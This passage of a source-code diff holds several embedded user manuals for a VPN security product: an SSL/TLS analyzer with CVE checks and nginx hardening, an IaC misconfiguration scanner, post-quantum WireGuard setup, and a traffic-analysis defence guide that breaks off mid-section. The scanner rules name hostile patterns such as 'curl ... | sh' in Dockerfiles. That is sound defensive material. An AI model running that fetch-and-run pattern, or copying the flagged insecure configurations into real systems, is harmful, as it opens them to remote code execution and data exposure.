+  TLS 1.2 (2008) — SHOULD be accepted
+    Current baseline. Acceptable when configured with
+    strong cipher suites (ECDHE + AES-GCM or ChaCha20-Poly1305).
+
+  TLS 1.3 (2018) — SHOULD be accepted
+    Modern standard. Removes all weak cipher suites.
+    Required for best performance (0-RTT handshake).
+    All browsers support TLS 1.3.
+
+  Recommended configuration:
+  ✓ TLS 1.3: ENABLED
+  ✓ TLS 1.2: ENABLED (with strong ciphers only)
+  ✗ TLS 1.1: DISABLED
+  ✗ TLS 1.0: DISABLED
+  ✗ SSL 3.0: DISABLED
+  ✗ SSL 2.0: DISABLED
+
+4. CIPHER SUITE ANALYSIS
+
+  Dangerous ciphers (flag as HIGH or CRITICAL):
+  NULL     → no encryption (data sent in plaintext)
+  EXPORT   → 40-bit keys (breakable in seconds)
+  RC4      → broken stream cipher (BEAST, RC4 biases)
+  DES      → 56-bit key (brute-forceable in hours)
+  3DES     → SWEET32 attack (birthday bound with 64-bit blocks)
+  aNULL    → anonymous key exchange (no server authentication)
+  MD5 MAC  → collision-vulnerable message authentication
+
+  Strong cipher suites (TLS 1.2):
+  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+  TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256
+  TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
+
+  TLS 1.3 cipher suites (all acceptable):
+  TLS_AES_256_GCM_SHA384
+  TLS_AES_128_GCM_SHA256
+  TLS_CHACHA20_POLY1305_SHA256
+
+5. KEY EXCHANGE & FORWARD SECRECY
+
+  Forward Secrecy (FS): each TLS session uses a unique key pair.
+  If the server's private key is later compromised, past sessions
+  remain encrypted — attacker cannot decrypt recorded traffic.
+
+  FS requires: ECDHE or DHE key exchange.
+  Non-FS: RSA key exchange (CRITICAL: supports decryption of
+  all past recorded sessions if private key is compromised).
+
+  DHE key size: must be ≥ 2048 bits (Logjam attack on <1024 bit)
+  ECDHE curves: prefer P-256, P-384, X25519 (avoid P-521 for perf)
+
+6. HTTP SECURITY HEADER CHECK
+
+  The analyzer also checks HTTP response headers:
+
+  HSTS (Strict-Transport-Security):
+  Required:  max-age ≥ 31536000 (1 year)
+  Better:    include includeSubDomains
+  Best:      include preload (submits to browser preload list)
+  Missing HSTS = HIGH (allows SSL stripping attacks)
+
+  Certificate Pinning (HPKP): deprecated but checked
+  CSP (Content-Security-Policy): reduces XSS impact
+  X-Frame-Options: DENY or SAMEORIGIN (clickjacking prevention)
+  X-Content-Type-Options: nosniff
+
+7. KNOWN VULNERABILITY DETECTION
+
+  The analyzer checks configuration against known attacks:
+
+  POODLE (CVE-2014-3566)
+    Requires: SSLv3 or TLS 1.0 with CBC cipher
+    Check: is SSLv3 or TLS 1.0 accepted?
+
+  BEAST (CVE-2011-3389)
+    Requires: TLS 1.0 with CBC cipher suite
+    Check: is TLS 1.0 accepted?
+
+  CRIME (CVE-2012-4929)
+    Requires: TLS compression enabled
+    Check: does server negotiate DEFLATE compression?
+
+  HEARTBLEED (CVE-2014-0160)
+    Requires: OpenSSL 1.0.1 through 1.0.1f
+    Check: TLS heartbeat extension response analysis
+
+  DROWN (CVE-2016-0800)
+    Requires: SSLv2 enabled on this or a related server
+    Check: SSLv2 negotiation attempt
+
+  FREAK (CVE-2015-0204)
+    Requires: EXPORT-grade cipher support
+    Check: RSA_EXPORT cipher negotiation
+
+  LOGJAM (CVE-2015-4000)
+    Requires: DHE key < 1024 bits
+    Check: DHE key size in handshake
+
+  ROBOT (CVE-2017-13099)
+    Requires: RSA PKCS#1 v1.5 key exchange vulnerability
+    Check: timing oracle on RSA decryption
+
+8. HOW TO USE
+
+  1. Navigate to SSL/TLS Analyzer (/ssl-tls).
+  2. Enter target: hostname only (example.com) or with port
+     (example.com:8443 for non-standard HTTPS).
+  3. Optional: enter SNI override if the cert CN doesn't match.
+  4. Click "Analyze". Scan takes 10–30 seconds.
+  5. Review findings by severity: CRITICAL → HIGH → MEDIUM → LOW.
+  6. Click "Download Report" for a formatted text file.
+
+  For targets behind a load balancer:
+  Run the scan multiple times — different backend servers may
+  have different TLS configurations. Inconsistent results across
+  runs indicate mixed configurations.
+
+9. READING THE REPORT
+
+  Finding format:
+  [SEVERITY] Finding Title
+  Detail: explanation of the issue
+  Evidence: specific data from the handshake proving the finding
+  CVE: relevant CVE identifier (if applicable)
+  Remediation: how to fix
+
+  Severity levels:
+  CRITICAL  → Immediate action required (expired cert, SSLv2/3)
+  HIGH      → Fix before next deployment (weak protocol/cipher)
+  MEDIUM    → Fix within 30 days (suboptimal config)
+  LOW       → Informational / best practice
+
+10. REMEDIATION REFERENCE
+
+  Disable SSLv2/3/TLS1.0/1.1 (nginx):
+    ssl_protocols TLSv1.2 TLSv1.3;
+
+  Set strong cipher suites (nginx):
+    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
+    ssl_prefer_server_ciphers off;
+
+  Enable TLS 1.3 (nginx 1.13+):
+    ssl_protocols TLSv1.2 TLSv1.3;
+
+  Add HSTS (nginx):
+    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
+
+  Enable DHE with 2048-bit group:
+    ssl_dhparam /etc/ssl/dhparam.pem;
+    (generate: openssl dhparam -out /etc/ssl/dhparam.pem 2048)
+
+  Enable OCSP stapling (nginx):
+    ssl_stapling on;
+    ssl_stapling_verify on;
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "iac-scanner-manual",
+    title: "IaC Security Scanner",
+    subtitle: "Terraform, CloudFormation, Kubernetes, Ansible, and Dockerfile misconfiguration detection",
+    version: "1.1",
+    pages: 14,
+    icon: FileText,
+    iconColor: "text-teal-400",
+    tier: "pro",
+    content: `IaC Security Scanner — User Manual
+Version 1.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Arsenal Tier Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview & Supported Formats
+2. Terraform Checks
+3. CloudFormation Checks
+4. Kubernetes Manifest Checks
+5. Dockerfile Checks
+6. Ansible Playbook Checks
+7. How to Use
+8. Fix & Re-scan Workflow
+9. CI/CD Integration
+10. Severity Reference
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW & SUPPORTED FORMATS
+
+  The IaC Scanner (/iac-scan) detects security misconfigurations
+  in Infrastructure-as-Code files before they reach production.
+  Catch misconfigured S3 buckets, overly permissive IAM roles,
+  exposed Kubernetes pods, and insecure Docker images at code review
+  time — not after a breach.
+
+  Supported formats (auto-detected by content):
+  • Terraform (.tf, .tfvars)
+  • CloudFormation (.yaml, .json — AWS)
+  • Kubernetes manifests (.yaml)
+  • Dockerfile (any name, Docker syntax)
+  • Ansible playbooks (.yaml with play structure)
+
+  Input options:
+  • Paste file content directly into the editor
+  • Upload a file (drag-and-drop)
+  • Enter a public GitHub raw URL (fetched server-side via VPN)
+
+2. TERRAFORM CHECKS
+
+  S3 Buckets:
+  CRITICAL: bucket acl = "public-read" or "public-read-write"
+  HIGH:     versioning not enabled
+  HIGH:     server-side encryption not configured
+  HIGH:     no MFA delete (objects can be permanently deleted)
+  HIGH:     public access block not set to all true
+  MEDIUM:   access logging disabled
+  LOW:      no lifecycle policy
+
+  IAM Resources:
+  CRITICAL: policy with "Effect":"Allow", "Action":"*", "Resource":"*"
+  HIGH:     policy allows "iam:*" (full IAM control)
+  HIGH:     policy allows "s3:*" on all resources
+  HIGH:     assume_role_policy allows "*" (any principal)
+  MEDIUM:   no MFA condition on sensitive actions
+  MEDIUM:   inline policy instead of managed policy
+
+  EC2 / Compute:
+  CRITICAL: security_group with ingress 0.0.0.0/0 on port 22
+  CRITICAL: security_group with ingress 0.0.0.0/0 on port 3389
+  HIGH:     security_group with ingress 0.0.0.0/0 on any port
+  HIGH:     instance without IMDSv2 (metadata endpoint v1)
+  HIGH:     unencrypted EBS volume
+  MEDIUM:   no VPC assignment
+  LOW:      no key pair for SSH access
+
+  RDS / Databases:
+  CRITICAL: publicly_accessible = true
+  HIGH:     no encryption at rest (storage_encrypted = false)
+  HIGH:     deletion protection disabled in production
+  HIGH:     backup retention = 0
+  MEDIUM:   no multi-AZ (single point of failure)
+  LOW:      no enhanced monitoring
+
+  General:
+  HIGH:     hardcoded secrets in .tf or .tfvars files
+            (detected by regex: password, secret, key = "literal")
+  HIGH:     no remote state backend (state stored locally)
+  MEDIUM:   no state locking (concurrent modification risk)
+
+3. CLOUDFORMATION CHECKS
+
+  IAM:
+  CRITICAL: Lambda execution role with "Action":["*"]
+  CRITICAL: EC2 instance profile with admin policy attached
+  HIGH:     IAM role with * in Action field
+
+  Storage:
+  CRITICAL: S3 bucket with PublicReadPolicy or PublicReadWritePolicy
+  HIGH:     S3 without server-side encryption
+  HIGH:     RDS without StorageEncrypted: true
+
+  Compute:
+  HIGH:     EC2 SecurityGroup with CidrIp: "0.0.0.0/0" on SSH/RDP
+  MEDIUM:   EC2 without VPC (EC2-Classic)
+  MEDIUM:   No DeletionPolicy on stateful resources
+
+4. KUBERNETES MANIFEST CHECKS
+
+  Container Security Context:
+  CRITICAL: securityContext.privileged: true
+            (full host kernel access — equivalent to root on node)
+  CRITICAL: securityContext.runAsUser: 0
+            (container running as root user)
+  HIGH:     securityContext.allowPrivilegeEscalation: true
+  HIGH:     No securityContext defined (defaults may be unsafe)
+  HIGH:     readOnlyRootFilesystem: false (default)
+  MEDIUM:   No runAsNonRoot: true
+
+  Host Access:
+  CRITICAL: hostPID: true (access all host processes)
+  CRITICAL: hostNetwork: true (access host network stack)
+  CRITICAL: hostIPC: true (access host IPC namespace)
+  HIGH:     volumes with hostPath (mounts host filesystem)
+
+  Resource Limits:
+  HIGH:     No resources.limits defined (container can DoS node)
+  MEDIUM:   No resources.requests defined
+
+  Service Accounts:
+  HIGH:     automountServiceAccountToken: true (default)
+            + pod has broad RBAC permissions
+  HIGH:     serviceAccountName: default (uses default SA)
+
+  Images:
+  HIGH:     image tag ":latest" (non-reproducible builds)
+  MEDIUM:   No image digest pinning
+
+  Network Policy:
+  MEDIUM:   No NetworkPolicy restricting pod ingress/egress
+  LOW:      All pods allow all ingress (default if no policy)
+
+5. DOCKERFILE CHECKS
+
+  User:
+  CRITICAL: No USER directive (runs as root by default)
+  HIGH:     USER root explicitly set
+  MEDIUM:   USER numeric ID not specified
+
+  Instructions:
+  HIGH:     ADD instead of COPY (ADD can extract archives / fetch URLs)
+  HIGH:     RUN apt-get upgrade (unpredictable package versions)
+  MEDIUM:   No HEALTHCHECK directive
+  LOW:      Multiple RUN apt-get commands (should be combined)
+
+  Secrets:
+  CRITICAL: ENV PASSWORD=... or ENV SECRET=... or ENV KEY=...
+            (secrets baked into image layers — readable in history)
+  CRITICAL: ARG with default value containing secret
+  HIGH:     COPY id_rsa or COPY .ssh (SSH key in image)
+  HIGH:     RUN curl ... | sh (remote code execution at build time)
+
+  Base image:
+  HIGH:     FROM ubuntu:latest or FROM node:latest (use versioned tags)
+  MEDIUM:   FROM large base image when alpine is feasible
+  MEDIUM:   Base image without known vulnerability scanning
+
+  Build best practices:
+  MEDIUM:   No .dockerignore (builds may include .git, node_modules)
+  LOW:      EXPOSE ports not documented
+  LOW:      No LABEL metadata (MAINTAINER deprecated)
+
+6. ANSIBLE PLAYBOOK CHECKS
+
+  Privilege escalation:
+  MEDIUM:   become: yes without become_user specified (runs as root)
+  LOW:      no_log: false on tasks handling passwords/secrets
+
+  File permissions:
+  HIGH:     file module with mode: "0777"
+  MEDIUM:   file module without explicit mode (defaults to system umask)
+
+  Secret handling:
+  HIGH:     vars: password: "hardcoded" (plaintext secrets)
+  HIGH:     No ansible-vault usage for sensitive variables
+  MEDIUM:   Debug task printing secrets (debug: var=secret)
+
+7. HOW TO USE
+
+  Step 1: Navigate to IaC Scanner (/iac-scan).
+  Step 2: Choose input method:
+    a) Paste file content into the editor
+    b) Upload file (drag-and-drop)
+    c) Enter GitHub raw URL
+
+  Step 3: File type is auto-detected. Override if needed.
+
+  Step 4: Click "Scan".
+  Scan time: <2 seconds for files under 1000 lines.
+
+  Step 5: Review findings:
+  • Sorted by severity: CRITICAL first
+  • Each finding shows: resource name, line number, issue, fix
+  • Click any finding to jump to the relevant line in the editor
+
+  Step 6: Click "Fix & Re-scan" on any finding to apply the
+  suggested fix and immediately re-scan to confirm resolution.
+
+8. FIX & RE-SCAN WORKFLOW
+
+  The Fix & Re-scan feature:
+  1. Click "Fix & Re-scan" on a finding.
+  2. The editor shows the suggested fix in-line (diff view).
+  3. Accept the fix → applies to the code in the editor.
+  4. Scan automatically re-runs.
+  5. Confirmed-fixed findings turn green.
+  6. Remaining findings stay red.
+  7. Download the fixed version when all CRITICAL/HIGH resolved.
+
+  NOTE: Suggested fixes are heuristic — always review before
+  applying to production code. Complex cases may need manual fix.
+
+9. CI/CD INTEGRATION
+
+  For automated scanning in GitHub Actions, GitLab CI, or any CI:
+
+  The IaC Scanner API is available at:
+  POST /api/iac-scan
+  Body: { "content": "<file content>", "type": "terraform" }
+  Response: { "findings": [...], "summary": { "critical": N, ... } }
+
+  Add to GitHub Actions (example):
+  ---
+  - name: IaC Security Scan
+    run: |
+      RESULT=$(curl -s -X POST \
+        -H "Authorization: Bearer $PROXHQ_API_KEY" \
+        -H "Content-Type: application/json" \
+        -d "{\"content\": $(cat main.tf | jq -Rs .), \"type\": \"terraform\"}" \
+        https://proxhqvpn.com/api/iac-scan)
+      CRITICAL=$(echo $RESULT | jq '.summary.critical')
+      if [ "$CRITICAL" -gt "0" ]; then
+        echo "CRITICAL IaC findings - blocking deployment"
+        exit 1
+      fi
+  ---
+
+10. SEVERITY REFERENCE
+
+  CRITICAL: Immediate exploitation risk. Publicly exposed data,
+            admin access to anyone, credentials in code.
+            Block deployment. Fix before any commit merges.
+
+  HIGH:     Significant risk. Vulnerable to targeted attack.
+            Fix before next sprint release.
+
+  MEDIUM:   Compliance or best-practice violation. Not immediately
+            exploitable but reduces defense depth.
+            Fix within 30 days.
+
+  LOW:      Informational / hygiene issue.
+            Address in technical debt backlog.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "post-quantum-manual",
+    title: "Post-Quantum Cryptography",
+    subtitle: "ML-KEM, ML-DSA, SLH-DSA, Classic McEliece — quantum-resistant VPN tunnel upgrade",
+    version: "1.0",
+    pages: 14,
+    icon: Zap,
+    iconColor: "text-violet-400",
+    tier: "pro",
+    content: `Post-Quantum Cryptography — User Manual
+Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. The Quantum Threat
+2. Why Current VPN Crypto Is Vulnerable
+3. NIST PQC Finalists — Supported Algorithms
+4. Algorithm Selection Guide
+5. Enabling Post-Quantum Mode
+6. Hybrid Mode (Classical + PQ Together)
+7. Performance Impact
+8. Compatibility Notes
+9. Testing & Verification
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. THE QUANTUM THREAT
+
+  A sufficiently powerful quantum computer running Shor's algorithm
+  can break RSA, ECDH, and ECDSA — the mathematical foundations of
+  all current TLS, SSH, VPN, and web PKI security.
+
+  Timeline estimates (as of 2026):
+  • Optimistic: 10–15 years to a cryptographically-relevant quantum
+    computer (CRQC) capable of breaking 256-bit ECDSA
+  • Conservative: 20–30 years
+  • Nation-state programs (IARPA, China): classified, likely faster
+
+  The "harvest now, decrypt later" attack is active TODAY:
+  Nation-state intelligence agencies are recording encrypted VPN
+  traffic at scale RIGHT NOW. When they have a CRQC, they will
+  decrypt all of that stored traffic retrospectively.
+
+  If your VPN carries sensitive data that is still sensitive in
+  10+ years, you need post-quantum cryptography now.
+
+2. WHY CURRENT VPN CRYPTO IS VULNERABLE
+
+  WireGuard uses:
+  • ECDH with Curve25519 for key exchange
+    → Shor's algorithm breaks ECDLP in polynomial time
+    → A CRQC breaks this in hours, not millennia
+  • ChaCha20-Poly1305 for symmetric encryption
+    → Symmetric crypto is quantum-resistant (Grover's gives
+       only quadratic speedup — 256-bit key remains 128-bit
+       quantum security. AES-256 and ChaCha20 are fine.)
+  • Ed25519 for session authentication
+    → Same ECDSA family — vulnerable to Shor's
+
+  The vulnerability is in the KEY EXCHANGE and AUTHENTICATION,
+  not in the bulk encryption. The fix: replace ECDH/ECDSA with
+  post-quantum alternatives while keeping ChaCha20 for data.
+
+3. NIST PQC FINALISTS — SUPPORTED ALGORITHMS
+
+  ML-KEM (CRYSTALS-Kyber) — KEY ENCAPSULATION
+    Standard: FIPS 203 (2024)
+    Replaces: ECDH key exchange
+    Based on: Module Learning With Errors (MLWE) problem
+    Security levels:
+      ML-KEM-512  → ~128 bits classical / ~128 bits quantum
+      ML-KEM-768  → ~192 bits classical / ~192 bits quantum (DEFAULT)
+      ML-KEM-1024 → ~256 bits classical / ~256 bits quantum
+    Public key size: 800 / 1184 / 1568 bytes (vs 32 for X25519)
+    Ciphertext size: 768 / 1088 / 1568 bytes
+
+  ML-DSA (CRYSTALS-Dilithium) — DIGITAL SIGNATURE
+    Standard: FIPS 204 (2024)
+    Replaces: Ed25519 WireGuard authentication signatures
+    Based on: Module Lattice problem
+    Security levels:
+      ML-DSA-44  → ~128 bits quantum security
+      ML-DSA-65  → ~192 bits quantum security (DEFAULT)
+      ML-DSA-87  → ~256 bits quantum security
+    Signature size: 2,420 / 3,293 / 4,595 bytes (vs 64 for Ed25519)
+
+  SLH-DSA (SPHINCS+) — HASH-BASED SIGNATURE
+    Standard: FIPS 205 (2024)
+    Conservative alternative to ML-DSA
+    No number-theoretic assumptions — security relies only on
+    hash function security (SHA-256 or SHAKE)
+    If lattice math is broken, SLH-DSA remains secure.
+    Signature size: 7,856–49,856 bytes (much larger than ML-DSA)
+    Performance: significantly slower than ML-DSA
+    Use when: maximum conservatism required
+
+  CLASSIC McELIECE — KEY ENCAPSULATION (OPTIONAL)
+    Based on: error-correcting code theory (50+ years of analysis)
+    Most conservative key encapsulation option available
+    Public key: 261,120 bytes (large — bandwidth impact)
+    Ciphertext: 128 bytes (small)
+    Use when: maximum security margins required and bandwidth
+              is not a concern
+
+4. ALGORITHM SELECTION GUIDE
+
+  For most users (Command Center Pro):
+    Key Exchange: ML-KEM-768 (default)
+    Authentication: ML-DSA-65 (default)
+    Bulk encryption: ChaCha20-Poly1305 (unchanged from WireGuard)
+
+  For maximum security (government / defense contractors):
+    Key Exchange: ML-KEM-1024 OR Classic McEliece
+    Authentication: ML-DSA-87 OR SLH-DSA-192 (slower but hash-based)
+    Hybrid mode: ON (run classical + PQ simultaneously)
+
+  For performance-sensitive deployments (mobile / low-bandwidth):
+    Key Exchange: ML-KEM-512
+    Authentication: ML-DSA-44
+    Hybrid mode: OFF
+
+5. ENABLING POST-QUANTUM MODE
+
+  Post-Quantum (/post-quantum) → Configuration tab
+
+  Step 1: Select algorithm profile:
+    Standard PQ (recommended): ML-KEM-768 + ML-DSA-65
+    High Security:             ML-KEM-1024 + ML-DSA-87
+    Maximum Conservative:      McEliece + SLH-DSA
+    Custom: pick each algorithm individually
+
+  Step 2: Select hybrid mode preference (Section 6).
+
+  Step 3: Click "Apply PQ Configuration".
+  → New WireGuard config is generated with PQ key material.
+  → All connected peers must also be running PQ-enabled clients.
+  → Reconnect all WireGuard clients with the updated config.
+
+  Step 4: Verify connection in Dashboard.
+  The connection status shows a ⬡ PQ badge when post-quantum
+  handshake is confirmed.
+
+6. HYBRID MODE (CLASSICAL + PQ TOGETHER)
+
+  Hybrid mode runs BOTH classical (X25519 / Ed25519) AND the
+  post-quantum algorithm simultaneously. The session key is derived
+  by combining both keys via XOR or KDF.
+
+  Why hybrid:
+  • If PQ algorithm is ever broken (theoretical), classical layer
+    still protects the session.
+  • If classical ECDH is broken by a CRQC, PQ layer protects.
+  • You are secure against both quantum AND classical attacks.
+
+  Overhead of hybrid: roughly classical + PQ combined.
+  ML-KEM-768 hybrid adds ~2–4ms per handshake vs. classical only.
+
+  Recommendation: ENABLE hybrid mode for all deployments.
+  The performance cost is negligible and the security gain is
+  significant (belt-and-suspenders against unknown vulnerabilities).
+
+7. PERFORMANCE IMPACT
+
+  Handshake overhead (one-time per WireGuard session):
+  ML-KEM-768 only:          +0.8ms handshake time
+  ML-KEM-768 hybrid:        +2.1ms handshake time
+  Classic McEliece:         +85ms handshake (large key transfer)
+
+  Per-packet overhead: NONE. Post-quantum only affects the
+  handshake. Once the session key is established, all traffic
+  uses ChaCha20-Poly1305 which is not changed.
+
+  Bandwidth overhead (per WireGuard handshake):
+  ML-KEM-768:      +2.3 KB additional data per handshake
+  ML-KEM-1024:     +4.7 KB additional data per handshake
+  Classic McEliece: +256 KB additional data per handshake
+
+  WireGuard handshakes occur every 2 minutes (180-second rekey).
+  The bandwidth overhead is minimal for all options except McEliece.
+
+8. COMPATIBILITY NOTES
+
+  Post-quantum WireGuard is NOT compatible with standard WireGuard
+  clients (wireguard-go, wg-quick on Linux, WireGuard iOS/Android).
+
+  Both endpoints MUST run PQ-enabled software:
+  • Server: ProxhqVPN API server with PQ extension
+  • Client: ProxhqVPN desktop app, mobile app, or any
+    WireGuard fork with NIST PQC support (e.g. mlkem-wireguard)
+
+  If a peer does not support PQ:
+  → The handshake will fail (not fall back to classical)
+  → This is by design — no silent downgrade to vulnerable crypto
+
+  To check peer compatibility before enabling PQ:
+  Post-Quantum → Compatibility Checker → enter peer public key
+  → Shows whether the peer's ProxhqVPN client version supports PQ
+
+9. TESTING & VERIFICATION
+
+  After enabling post-quantum mode:
+
+  Test 1 — Dashboard PQ badge:
+  Dashboard → connection status should show ⬡ PQ ACTIVE badge.
+
+  Test 2 — Handshake log verification:
+  Terminal → journalctl -u wg-quick@wg0 | grep -i "pq\|kyber\|dilithium"
+  Should see: "PQ handshake complete: ML-KEM-768 + ML-DSA-65"
+
+  Test 3 — Key material inspection:
+  Post-Quantum → Status → shows:
+  • Current session key algorithm
+  • Last PQ handshake timestamp
+  • Peer PQ public key fingerprint
+
+  Test 4 — Quantum-resistant leak test:
+  Leak Detection (/leaks) → PQ Check tab
+  Verifies the handshake used PQ algorithms and not classical fallback.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "daita-manual",
+    title: "DAITA — Defense Against AI Traffic Analysis",
+    subtitle: "Packet padding, timing jitter, dummy traffic, and constant bandwidth mode",
+    version: "1.0",
+    pages: 12,
+    icon: Eye,
+    iconColor: "text-indigo-400",
+    tier: "pro",
+    content: `DAITA — Defense Against AI Traffic Analysis — User Manual
+Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. What Traffic Analysis Reveals
+2. How AI Website Fingerprinting Works
+3. DAITA Technique 1 — Packet Padding
+4. DAITA Technique 2 — Timing Jitter
+5. DAITA Technique 3 — Dummy Traffic Injection
+6. DAITA Technique 4 — Constant Bandwidth Mode
+7. Enabling DAITA
+8. Configuration Options
+9. Performance Impact
+10. What DAITA Does NOT Protect Against
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. WHAT TRAFFIC ANALYSIS REVEALS
+
+  Even with a VPN active, an adversary who can observe your
+  encrypted tunnel traffic (your ISP, a network monitor, a state
+  surveillance system) can learn:
+
+  • WHICH WEBSITES you visit — even without decrypting traffic
+  • WHAT ACTIONS you take — loading a search results page vs.
+    an article vs. a video has distinct packet size patterns
+  • WHEN you are active — precisely which minutes you are online
+  • WHAT APPLICATION is generating traffic — Netflix vs. Zoom vs.
+    SSH has statistically distinct traffic signatures
+
+  This is called Website Fingerprinting (WF). Research papers have
+  demonstrated up to 95% accuracy in identifying websites from
+  encrypted traffic patterns alone. Classifiers trained on WireGuard
+  tunnel data can identify visited sites from packet metadata.
+
+2. HOW AI WEBSITE FINGERPRINTING WORKS
+
+  A WF attack requires:
+  1. The attacker observes your encrypted traffic (ISP, tap)
+  2. The attacker has a trained ML model (classifier)
+  3. The model inputs: sequence of packet sizes + timing intervals
+  4. The model outputs: "this is YouTube" or "this is Tor Browser"
+
+  Features extracted from encrypted packets (without decryption):
+  • Packet sizes (in bytes) — every website has a characteristic
+    distribution of large vs. small packets
+  • Inter-packet timing (microseconds between packets)
+  • Burst patterns (groups of packets sent together)
+  • Cumulative traffic curve shape
+  • Number of cells (in Tor's case) or packets at each time
+
+  Modern WF classifiers: Deep Fingerprinting (DF), Triplet Fingerprint,
+  ESPRESSO — achieve 95%+ accuracy in closed-world settings.
+  DAITA defeats these by making all traffic look statistically identical.
+
+3. DAITA TECHNIQUE 1 — PACKET PADDING
+
+  All outbound packets are padded to fixed bucket sizes:
+  • 256 bytes (small — control, ping, DNS)
+  • 512 bytes (medium — API responses)
+  • 1024 bytes (large — web content)
+  • 1448 bytes (maximum — MTU for most links)
+
+  The real payload is encrypted inside the packet. The outside
+  sees only: a stream of fixed-size packets.
+
+  Before padding (vulnerable):
+  GET / (40 bytes) → GET /index.html (1210 bytes) → GET /logo.png (4820 bytes)
+  Pattern matches: loading a website's home page.
+
+  After padding (protected):
+  [1448] → [1448] → [1448] → [1448] → [1448]
+  Pattern: indistinguishable — could be any website.
+
+  Padding mode options:
+  • Conservative: pad to nearest power-of-2 size bucket
+  • Aggressive: pad ALL packets to maximum MTU size (1448)
+    (Maximum protection, highest bandwidth overhead)
+  • Adaptive: dynamically select bucket based on traffic type
+    (Balanced protection and performance)
+
+4. DAITA TECHNIQUE 2 — TIMING JITTER
+
+  Random delay is injected per-packet before transmission:
+  • Default jitter range: 1–50ms (uniform random)
+  • Alternative: Gaussian distribution (μ=10ms, σ=5ms)
+  • Alternative: Exponential distribution (Poisson-like)
+
+  Before jitter (vulnerable):
+  Packet 1: T=0ms, Packet 2: T=25ms, Packet 3: T=30ms
+  This precise timing signature identifies the resource loading
+  sequence of a specific website.
+
+  After jitter (protected):
+  Packet 1: T=0ms, Packet 2: T=37ms, Packet 3: T=82ms
+  The randomization destroys the timing-based feature vector that
+  WF classifiers rely on.
+
+  Jitter range tradeoff:
+  • Narrow jitter (1–5ms): better performance, lower protection
+  • Wide jitter (1–100ms): maximum protection, noticeable latency
+  • Default 1–50ms: balanced for most use cases
+
+5. DAITA TECHNIQUE 3 — DUMMY TRAFFIC INJECTION
+
+  Synthetic cover traffic is continuously injected into your
+  VPN tunnel, even when no real traffic is flowing.
+
+  Dummy traffic characteristics:
+  • PRNG-generated data (cryptographically random payload)
+  • Encrypted in the WireGuard tunnel (indistinguishable from real)
+  • Rate: configurable (default: 10% of current average bandwidth)
+  • Distribution: Poisson arrival process (mimics real traffic)
+  • Dummy HTTPS-looking frames (same size distribution as real web)
+
+  Why it works:
+  WF classifiers analyze "idle periods" vs. "active periods".
+  With dummy traffic, the classifier sees continuous activity —
+  it cannot identify when real traffic starts or ends.
+
+  Also defeats: traffic correlation attacks. An adversary
+  watching both ends of your tunnel cannot correlate your
+  traffic with a destination by timing gaps in the flow.
+
+  Cover traffic rate (configurable):
+  Off:         no dummy traffic (minimum overhead)
+  Low (5%):    light noise, some protection
+  Medium (20%): default — good balance
+  High (50%):  strong protection, significant bandwidth use
+  Constant:    see Technique 4
+
+6. DAITA TECHNIQUE 4 — CONSTANT BANDWIDTH MODE
+
+  Transmits at a fixed bandwidth rate regardless of actual usage.
+
+  Your tunnel looks like:
+  Idle:         [----][----][----][----][----]  ← constant 2 Mbps
+  Streaming:    [----][----][----][----][----]  ← still constant 2 Mbps
+  Nothing:      [----][----][----][----][----]  ← still constant 2 Mbps
+
+  An adversary sees: constant flow. Completely indistinguishable.
+
+  Rate options:
+  • 256 Kbps — compatible with slow connections (cellular roaming)
+  • 1 Mbps  — default
+  • 5 Mbps  — for high-speed connections
+  • 10 Mbps — maximum (requires fast upstream)
+
+  NOTE: Constant Bandwidth Mode consumes exactly the configured
+  bandwidth rate 24/7, even when you are not using the internet.
+  Use only if you have an unmetered connection.
+
+7. ENABLING DAITA
+
+  DAITA (/daita) → Configure tab
+
+  Step 1: Select techniques to enable:
+    ☑ Packet Padding     (low overhead, high protection)
+    ☑ Timing Jitter      (low overhead, high protection)
+    ☑ Dummy Traffic      (medium overhead, very high protection)
+    ☐ Constant Bandwidth  (high overhead, maximum protection)
+
+  Step 2: Configure per-technique settings (Section 8).
+
+  Step 3: Click "Enable DAITA".
+  DAITA is applied to your active WireGuard tunnel immediately.
+  No reconnect required.
+
+  Status indicator: DAITA tab shows green "ACTIVE" badge.
+  Dashboard: shows DAITA shield icon on active connection.
+
+8. CONFIGURATION OPTIONS
+
+  Packet Padding:
+    Mode: Conservative / Aggressive / Adaptive (default: Adaptive)
+    Custom bucket sizes: add/remove size buckets
+
+  Timing Jitter:
